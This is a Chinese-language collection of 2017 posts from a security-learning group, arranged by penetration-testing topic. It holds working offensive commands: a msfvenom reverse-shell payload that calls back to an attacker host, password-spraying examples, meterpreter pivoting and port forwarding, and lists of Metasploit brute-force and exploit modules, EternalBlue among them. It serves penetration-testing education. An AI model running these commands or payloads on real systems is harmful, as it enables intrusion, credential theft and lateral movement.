# Penetration Testing
子目录:
- [端口渗透](#端口渗透)
- [防火墙](#防火墙)
- [webshell扫描](#webshell扫描)
- [域渗透](#域渗透)
- [MSF](#msf)
- [UNIX Shell](#unix-shell)
- [PowerShell](#powershell)
- [WSH Injection](#wsh-injection)
- [Downloader](#downloader)
- [MS Office](#ms-office)
- [Windows COM](#windows-com)
- [Exchange](#exchange)
- [边界设备安全](#边界设备安全)
- [信息收集](#信息收集)


## 端口渗透


<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-15:

看到一篇关于端口渗透的总结，认真读完发现自己还有一些是自己没见过的，不知道算不算全面，有好的希望大牛们能分享一下。QAQ
有个师傅给我的建议是找相应的版本，docker部署测试。

[端口渗透总结_91Ri.org](http://www.91ri.org/15441.html)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 肯定不全面呀，看看ZoomEye/Shodan都采集那些端口就知道渗透会关注哪些端口

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 很多链接点进去都是升级中。。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 你不知道wooyun?

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 知道啊，而且有的百度网盘地址也没了[捂脸]

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😂😂😂,但是里面的案例挺多的，都可以找的到。
刚知道wooyun的时候已经升级四五个月了。🌝，原来他们厂商的妹子这么可爱。😊😊

<img src="https://file.xiaomiquan.com/5e/5a/5e5a39f8f365b2fbbdd765b06a1dae92286f866a9151873c7aeefd498eed7e80.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 有个玩意叫做镜像QAQ，静香静香，我是胖虎

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 
[端口渗透总结](http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html)




你们之前发的

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: ?
怎么啦。[囧]

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 没事，就是和这个文章一样

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 文章里面的附件都失效了

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 附件是一个各种端口的总结嘛，百度有很多啊

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 然后实际乌云漏洞库一搜就有。


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-12-03:

一份端口对应表


<img src="https://file.xiaomiquan.com/1ba/77/ba7700623c2249250a651d271eee30db554a9f5a9ede1037cfc3193a35bfe866.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 一眼没看到 Redis 的 6379，Memcached 的 11211😅

<img src="https://file.xiaomiquan.com/ec/79/ec79f1ae40a87bdefb4cfcea54a627dc1c28043bc62b1e0cb1ccc57f6fbcba40.jpg" width="25px"/> __test2504__: 挺可惜的，还是少了一些常见的端口

<img src="https://file.xiaomiquan.com/b7/f5/b7f5c4ac2c8c032c26ba4fd222cebd77a07b4d0d3ee27ac28e2e3ae8907fc59f.jpg" width="25px"/> __兜兜有糖不给你吃__: 常用的不是系统自带有个记事本里全有么，不过你这个醒目，赞一个

<img src="https://file.xiaomiquan.com/be/28/be28e097e4426d5bbccd2babaef685141be988f0a59f737cee8cc8900a29a2f7.jpg" width="25px"/> __。。__ replies to <img src="https://file.xiaomiquan.com/b7/f5/b7f5c4ac2c8c032c26ba4fd222cebd77a07b4d0d3ee27ac28e2e3ae8907fc59f.jpg" width="25px"/> __兜兜有糖不给你吃__: 请问一下大佬这个记事本放在那的[微笑]

<img src="https://file.xiaomiquan.com/b7/f5/b7f5c4ac2c8c032c26ba4fd222cebd77a07b4d0d3ee27ac28e2e3ae8907fc59f.jpg" width="25px"/> __兜兜有糖不给你吃__ replies to <img src="https://file.xiaomiquan.com/be/28/be28e097e4426d5bbccd2babaef685141be988f0a59f737cee8cc8900a29a2f7.jpg" width="25px"/> __。。__: windows\system32\drivers\etc\services

<img src="https://file.xiaomiquan.com/be/28/be28e097e4426d5bbccd2babaef685141be988f0a59f737cee8cc8900a29a2f7.jpg" width="25px"/> __。。__ replies to <img src="https://file.xiaomiquan.com/b7/f5/b7f5c4ac2c8c032c26ba4fd222cebd77a07b4d0d3ee27ac28e2e3ae8907fc59f.jpg" width="25px"/> __兜兜有糖不给你吃__: 找到了，谢谢[微笑]

<img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 也没看到Mongodb 27017[呲牙]


...

---


## 防火墙


<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-24:


__#姿势#__

  当服务器只开web服务并且防火墙不准服务器对外主动发起链接时，这样来突破！

当我在渗透测试的时候，拿到了web shell可以执行命令时，总想反弹shell出来方便进一步渗透，但是我碰到的环境安全性都做的很好，防火墙策略直接禁止服务器对外发起链接。这样就没法反弹了。

然后我自己有想过突破的方法，我当时想到的是重新封装http的数据包，到服务器后再拆包，转到22端口上去，这样做很复杂，一直没去实现。

今天在freebuf看到这篇文章，就忍不住转过来分享一下，作者在服务器上直接对源端口进行检查，然后将特定的源端口数据通过iptables nat表中PREROUTING 链配合 REDIRECT 重定向到本机22端口去，当时怎么没想到。这个在一些防火墙策略做的很完善的环境下，很有用！

[远程遥控IPTables进行端口复用](http://mp.weixin.qq.com/s/W5npN8YiqG-RBoq2mTv_2g)



---


## webshell扫描

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

> 匿名用户 提问：
使用字典远程扫描webshell，脚本发现疑似webshell后如何更好的进一步自动化甄别与判断。（假设密码已知，webshell包括大小马和一句话）


以前我们做过这个研究，这种远程扫描来准确识别并不容易，对于已知 Webshell，我们可以加精准特征（比如：HTML 里的内容、代码执行的返回内容、特别的文件名等），想通过什么好算法来处理，其实很难。


---

## 域渗透

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
想学习有关域渗透的一些资料，windows域 08/12/WIN10安全检测及bypass，挺说还有linux域，感觉在这方面很欠补，毕竟环境接触的少，网上说的都模棱两可，大多不可行，弄的晕头转向，想权威体质的学习一下


安全技能树里推荐了不少，如果你真想感受，首先得“坏”。


---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-21:

PowerView的作者HarmJ0y写的一些该脚本的使用方法，windows域的侦察方法基本上都涵盖到了。HarmJ0y是SpecterOps公司的员工，是Empire、BloodHound、PowerView、Veil-Framework、PowerSploit 这些工具的主要开发者之一。


[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)



[The PowerView PowerUsage Series #1 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/)



[The PowerView PowerUsage Series #2 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/)



[The PowerView PowerUsage Series #3 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 都是神器，服

<img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 只能看懂百分之二十[捂脸]我感觉别的不敢说，在贵圈待久了我英语阅读能力可以提高

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 必须能提高[偷笑]


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-23:

> 匿名用户 提问：
【漏洞挖掘思路】 cos前辈，面对内网数千台服务器（内网互访，数据库、操作系统、web容器等均不超过4种，安全设备透明），只有ip信息，如何通过人工高效挖掘漏洞，求战略性指导意见。


人工？我先不管你是不是一定要纯粹人工，如果不是，可以这样：

1. 大规模端口探测，看端口都开放了什么，找对应服务漏洞；
2. 爆破相关服务的密码；
3. 挖你说的这几个不是件容易的事，但有 0day 那就可以畅通无阻；
4. 别漏了路由器漏洞，嵌入式固件的漏洞挖掘相对容易些；
5. 玩玩 Responder MITM；
6. 有域控，试试 DeathStar；
7. 不用问我更多了，技巧也许会太多，一切看场景，而且还得看你能否更进一步。

擅于使用相关工具、掌握各类渗透技巧及掌握 Python 这类语言进行必要编码，才能高效。



...

<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 内网ftp服务器可以提权拿下吗，同服务器下还有个网站

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 目标不同，手法不同？拿到某个机器，还是控制整个内网？
切记，千万，千万不要用arp，尽量动静小点

看内网是域还是工作组。

域可以看看GPP ms14068

工作组相对来说麻烦一点(很难控制整个内网)

内网拿到一台机器之后，记着提取本地的缓存凭据，后续扩大渗透，还有看看进程是否有域管理员。


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-11-13:


__#基础#__

 域渗透基础教程
之前有小伙伴咨询域渗透的技术，这里有个比较初级。
从域的搭建，到端口转发、代理、反弹shell、信息收集、抓HASH，都有介绍，还附带了一些常用工具。适合对内网渗透不了解的同学看一下，都看明白之后，其它内网渗透文章就没什么问题了。

[GitHub - l3m0n/pentest_study: 从零开始内网渗透学习](https://github.com/l3m0n/pentest_study)




<img src="https://file.xiaomiquan.com/107/17/0717b38c146bd2105fe2ce031a1b395cc1a2717e57b6efa3689339f7df5311e8.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1d4/37/d4379b2a5377b798074e0304d7b069bf200fb11dbed8b16c541bc98d3d594ae2.png" width="50%" height="50%" align="middle"/>



---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-12-04:


__#tools#__

在Active Directory环境下渗透测试时没，我们获取了一个window的凭据，准备横向移动，登录更多的机器，来获取信息，此时我们需要使用多个"用户帐户"一个或常见的几个密码来蛮力攻击，使用这种方法可避免账户锁定，

Spray工具可用于三种Windows域身份验证服务：SMB用于内部测试，OWA和Lync用于外部测试
  
Example: `spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 SPIDERLABS`
  
Example: `spray.sh -owa 192.168.0.1 users.txt passwords.txt 1 35 post-request.txt`
  
Example: `spray.sh -lync https://lyncdiscover.spiderlabs.com/ users.txt passwords.txt 1 35`

[Simplifying Password Spraying](https://www.trustwave.com/Resources/SpiderLabs-Blog/Simplifying-Password-Spraying/)



[GitHub - SpiderLabs/Spray: A Password Spraying too...](https://github.com/SpiderLabs/Spray)





---


## MSF


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:


__#姿势#__

  今天再转篇 FreeBuf 的文章《MSF外网持久控制Android手机并渗透测试局域网》：


[MSF外网持久控制Android手机并渗透测试局域网 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/136574.html)



这个大三学生动手能力不错，哪家相关安全公司需要，可以考虑收了。

年轻人应该多折腾，守正出奇。把握好度就行，一定要把握好度，否则，违法犯罪你迟早跑不掉。

BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。



...

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 我也看了，感觉好像有办法实验一次，不过有很多点疑问，试试再来请教可好，现在就有个问题，我用dns欺骗在家里能骗局域网内一台机（共8台只能骗一台），在办公室一台都骗不了，一执行还把人弄死你了，大侠请赐教

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 你怎么做dns欺骗的？

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 说到守正出奇，今晚突然想起之前看过的一个贴，[tieba.baidu.com/p/4963716287?see_lz=1&pn=1](tieba.baidu.com/p/4963716287?see_lz=1&pn=1)  这位大兄弟的SE也是六到没谁了

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: kali下用ettercap,,扫描主机经常扫不全，中间人经常无效……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比看看 bettercap

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 所以啊有高手快速指导反馈才能进步，半年前就这个问题折腾的半死，最后都停止玩了，两台电脑一台没问题，一台win10下虚拟机能nat联网，可是不能桥接，网上都查遍了也没解决

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比结果可以再反馈下

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这种远程问就是很难弄明白，各种小问题非常繁琐，每一个小坑都要折腾半死，烦的自己都不好意思一直问

<img src="https://file.xiaomiquan.com/e6/16/e616b63d215ace23913e168c6b8d4f4b20eeab9eb71886ecabb3bd60cd4f07fe.jpg" width="25px"/> __萝卜__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: ettercap跟bettercap都试过 感觉都是时灵时不灵 cos哥有没有更稳定的中间人工具推荐？


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-07:

MSF内网渗透系列-反弹shell

渗透测试时，通过WEB漏洞，拿到了目标网络边缘服务器的webshell，或者通过社工钓鱼，控制了目标办公网络中的一台个人机。

那么结下来就是利用MSF反弹回一个shell，开始在内网扩大我们的战果。

接下来介绍几个基本概念：

payload，又称为攻击载荷。想要返回一个shell，就要在目标机执行我们的payload

正向shell (bind)，需要攻击机主动连接目标端口，如windows/shell/bind_tcp和windows/meterpreter/bind_tcp这两个payload，就会反弹一个正向的shell

反向shell（reverse），目标机会反连接攻击机，如windows/shell/reverse_tcp和windows/meterpreter/reverse_tcp，就会反弹一个反向的shell

meterpreter，Metasploit的一个payload，它具有强大的功能，其具备端口转发和socks代理功能简直就是内网渗透测试神器，windows/meterpreter/reverse_tcp和windows/meterpreter/bind_tcp就会反弹一个meterpreter的shell

在Linux下，那么payload可以选择python/meterpreter/reverse_https

以在window下反弹一个meterpreter的shell为例：

首先利用msfvenom生成我们payload的执行程序：

```
msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.31.166 LPORT=1234 -f exe > ./test.exe
```

在目标机192.168.31.196上执行test.exe，使用exploit/multi/handler模块监听，如图，可以看到返回了一个meterpreter的shell

<img src="https://images.xiaomiquan.com/FvpV6xJty5T8eQVL5x3dvE2DOIXU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:YezmO3MN-DKsGVcqg5bgrhgPzCU=" width="50%" height="50%" align="middle"/>


...


<img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 在目标机上执行？你想执行就执行？

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 是的

...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-15:

MSF内网渗透系列-信息收集

对内网进行渗透，首先我们要做好信息收集工作，摸清楚内网环境

总体上来说，内网环境无非两种：域和工作组。当然就只针对域的渗透，我们都可以单独拿出来，做一系列的教程了。

这里我们做无差别处理。下面进入本系列正题，利用MSF进行内网信息收集：

__本地常规信息收集__

Windows：
[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows)



Linux: 
[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux)



__本地HASH__

meterpreter下利用hashdump从SAM导出密码哈希值

__MSF端口扫描__

利用search portscan查找相关模块。如：auxiliary/scanner/portscan/tcp,我们可以利用该模块扫描同段开3389的机器:

`..msf>use auxiliary/scanner/portscan/tcp`   //选择模块

`..msf>set PORTS 3389`                      //设置端口

`..msf>set RHOSTS 192.168.0.1/24`            //扫描192.168.0.1/24网段内开放3389的主机

__MSF服务扫描__

SMB版本识别：auxiliary/scanner/smb/smb_version  来尝试识别windows的版本

MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433

SSH版本信息：auxiliary/scanner/ssh/ssh_version

FTP版本识别：auxiliary/scanner/ftp/ftp_version

HTTP服务：auxiliary/scanner/http/http_header  我一般用来扫描内网中的WEB服务器，返回相关头信息

图：利用auxiliary/scanner/ssh/ssh_version识别metaslpoitable的ssh版本信息：

<img src="https://images.xiaomiquan.com/FhNBOpcgNqENAJ_T4XpzZc9iDlgZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:--muZSfblaIxpdGW_mVD_44gmZs=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-23:

MSF内网渗透系列——穿越边界

前篇系列文章发出以后，很多新接触MSF小伙伴会有疑问:MSF做内网渗透总不能在内网找个机器安装一个MSF吧，这当然是可以的。还有小伙伴想到可以利用proxychain把MSF代理到目标内网，这也没毛病。

下面我就介绍几个MSF自身穿越边界的姿势。

假设我们在VPS上搭建了MSF，已经在目标内网中反弹回了一个meterpreter。那么我们就可以利用这个shell建立一条内网访问通道

情景一：利用MSF扫描目标内网smb_version

pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到目标内网环境

sessions一下看看我们shell的信息：如下

```。。
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > sessions
。
。Active sessions
。===============
。
。  Id  Type                      Information  Connection
。  --  ----                      -----------  ----------
。  1   meterpreter python/linux  user @ test  8.8.8.8:443 -> 101.101.101.101:35272 (10.10.10.10)
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

我们发现session的ID为1，内网ip为10.10.10.10

那么就可以在metasploit添加一个路由表，目的是访问10.10.10.11将通过meterpreter的session 1 来访问，如下：

```
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > route add 10.10.10.11 255.255.255.255 1  //route add  目标i或ip段  掩码  session的ID
。
。[*] Route added
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

然后我们就可以：

```
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > use auxiliary/scanner/smb/smb_version
。
。msf auxiliary(smb_version) > set rhosts 10.10.10.11  //如果想扫面整个C段 set rhosts 10.10.10.11/24
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

如果我们想让其他一些工具（如：Nmap）利用该路由表到目标内网搞事情呢？

这里MSF的socks4a模块就可以提供一个监听隧道供其他应用程序访问：auxiliary/server/socks4a

情景二：访问目标内网一个服务器（10.10.10.12）80端口的web应用

我们可以利用meterpreter的portfwd把内网web服务器的80端口转发到我们VPS(8.8.8.8)的8088端口。然后我们就可以通过
[http://8.8.8.8:8088/](http://8.8.8.8:8088/)

访问
[http://10.10.10.12:80](http://10.10.10.12:80)



首先session -i 1进入meterpreter，然后做端口转发，如下：

```
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf auxiliary(smb_version) > sessions -i 1
。[*] Starting interaction with 1...
。
。meterpreter > portfwd add -l 8088 -r 192.168.31.169 -p 80
。[*] Local TCP relay created: :8088 <-> 192.168.31.169:80
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
```

后记：在整理这篇文章的时候，就想着出个番外篇，专门整理一下其他穿越边界的各种姿势


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:


__#姿势#__

免杀 MSF Windows Payload 的方法与实践

原创@Moriarty  

MSF 已经是广为人知的非常流行的渗透平台，没有之一。而作为专注于后渗透的我，最常用的也是 MSF 强大的后渗透功能。在实战当中，经常需要在目标环境中获取一个 Meterpreter 的 shell。那么我面临的第一个问题，就是如何安安稳稳地、神不知鬼不觉地在目标环境中执行 Meterpreter 的 Payload。目前网上流行的免杀和隐蔽执行的思路有很多，今天我给大家介绍一下我屡试不爽的猥琐流方法。

继续阅读：


[免杀 MSF Windows Payload 的方法与实践](http://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA)



<img src="https://images.xiaomiquan.com/FuAF4GxXRaqAg4xPxw8Ia9qPfJL2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o4C2jrRosZz9Ju69zxh2K9pp7q4=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-08-27:

MSF内网渗透系列——端口渗透

不多说了，端口检测备忘录，整理常用端口对应MSF的相关模块。欢迎补充

port：21 （FTP）
```
auxiliary/scanner/ftp/ftp_login     //FTP登陆爆破
其它：search FTP。FTP常见利用方式，除了直接获取文件，还要注意目录跨越漏洞，成功利用，可以直接反弹shell内网常见
```

port:22  (SSH)
```
auxiliary/scanner/ssh/ssh_login    //SSH登陆爆破
其它：search SSH
```

port:23  (telnet)
```
auxiliary/scanner/telnet/telnet_login    //主要目标是内网中的路由器，交换机等网络设备
```

port:80，8080，443 (附：web服务常见端口整理，见图)
```
http服务，内网开放的web服务安全性往往比较差，注入，弱口令...web渗透在内网依然重要
```

port:445 (简直无需多说的端口）
```
exploit/windows/smb/ms08_067_netapi         //上古漏洞，依然有惊喜
exploit/windows/smb/ms17_010_eternalblue    //永恒之蓝
auxiliary/scanner/smb/smb_login             //SMB登陆爆破
其它：search smb | Samba。linux下的CVE-2017-7494， 445 端口的远程利用
```

port:3389   (远程桌面RDP)
```
auxiliary/scanner/rdp/ms12_020_check 
```

5900  (VNC)
```
auxiliary/scanner/vnc/vnc_none_auth
auxiliary/scanner/vnc/vnc_login
exploit/multi/vnc/vnc_keyboard_exec
```

数据库：

